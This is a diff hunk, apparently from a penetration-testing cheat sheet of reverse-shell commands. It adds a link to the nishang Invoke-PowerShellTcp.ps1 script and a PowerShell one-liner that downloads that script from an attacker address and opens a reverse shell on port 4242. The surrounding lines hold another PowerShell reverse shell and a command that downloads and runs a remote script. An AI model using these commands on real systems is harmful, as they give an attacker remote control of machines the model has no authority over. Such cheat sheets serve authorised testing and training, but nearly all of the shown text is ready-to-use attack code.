@@ -256,6 +256,11 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.213.
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
 
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.213.254:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.213.254 -Port 4242
+```
+
 ### Awk
 
 ```powershell
